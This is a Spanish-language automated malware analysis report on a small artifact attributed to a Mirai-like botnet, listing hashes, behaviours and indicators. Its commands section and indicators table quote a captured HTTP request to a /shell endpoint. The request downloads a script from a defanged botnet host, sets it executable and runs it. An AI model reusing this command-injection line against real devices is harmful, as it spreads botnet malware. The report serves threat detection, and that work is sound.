# 🧬 Payload Analysis

`52a5a11eb588b4172e5ee9b1265e89641db42bc1065e0c9e08cc4ab6ae366e4a`

## 📌 Resumen

Artefacto asociado a la familia **mirai-like** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Cambio de permisos, Ejecución, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Categoría:** `Botnet`
- **Familia:** `mirai-like`
- **Confianza de familia:** `Media`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:40:04.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `52a5a11eb588b4172e5ee9b1265e89641db42bc1065e0c9e08cc4ab6ae366e4a`
- **MD5:** `0a95f5939bb2ff8de61a6d3896e83cb5`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 196 B |
| Entropía | 5.21 |
| Strings | 5 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Ejecución**
4. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+-rf+kla.sh;wget+hxxp://aibotnet[.]su/bins/kla.sh;chmod+777+kla.sh;./kla.sh HTTP/1.1
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://aibotnet[.]su/bins/kla.sh;chmod+777+kla.sh;./kla.sh | strings |
| ip | 190.179.175.XXX | static_analysis |
| command | GET /shell?cd+/tmp;rm+-rf+kla.sh;wget+hxxp://aibotnet[.]su/bins/kla.sh;chmod+777+kla.sh;./kla.sh HTTP/1.1 | strings |
| hash | 52a5a11eb588b4172e5ee9b1265e89641db42bc1065e0c9e08cc4ab6ae366e4a | static_analysis |
| ip | 132.243.194.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
